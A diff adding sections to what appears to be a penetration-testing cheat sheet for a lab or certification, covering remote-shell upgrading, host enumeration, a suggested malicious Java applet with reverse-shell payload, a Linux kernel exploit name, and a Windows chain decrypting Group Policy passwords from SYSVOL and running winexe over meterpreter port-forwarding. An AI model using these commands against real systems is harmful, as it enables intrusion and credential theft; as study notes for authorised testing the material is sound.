@@ -34,3 +34,42 @@ khgsjdgk865kn9gjrkjtyo9ujg:y689rkjhty
 ## WORDLISTS
 - /usr/share/dirbuster/wordlists/directory-list....
 
+## SHELL
+few commands to allow us better control of our new remote shell.
+```
+# execute them in the following order (on every new shell)
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=linux
+```
+
+## GATHER INFORMATION
+```
+cat /etc/issue
+uname -a
+```
+- locate `.htaccess` or any other related files that might indicate on another/internal/hidden network.
+- locate `apache2` logs, they mightreveal more information about the webserver. a usage of java might be another way to exploit other users/services. (leading to client-side attack) we can add/alter the app code to push our maliciouse java applet with a reverse-shell payload.
+
+## PRIVELEGDA ESCALATION
+### LINUX
+- `mempodipper`
+
+### WINDOWS
+- domain controller
+ - enumerate the domain controller information
+ - map the SYSVOL share to our client `net use z:\\dc01\SYSVOL`
+ - search the folder for files `dir /s grups.xml` ...
+ - find password/s in the file, and use `gpp-decrypt` to decrypt it
+ - one the password is decrypted, we'll use `winexe` to execute remote commands as the local admin.
+  - within our meterpreter session...
+   - using `port-forwarding` will pass our `winexe` commands from our kali machine to the remote machine.
+   - route add `destination-network class` 255.255.255.0 1
+   - `route add 10.11.1.0 255.255.255.0 1`
+   - `portfw add -l 445 -p 445 -r 10.7.0.22`
+   - `portfw delete -l 445 -p 445 -r 10.7.0.22`
+  - within our kali box
+   - the following command is routed via our kali machine
+   - `winexe -U username%password //127.0.0.1 "cmd"`
+
+
+
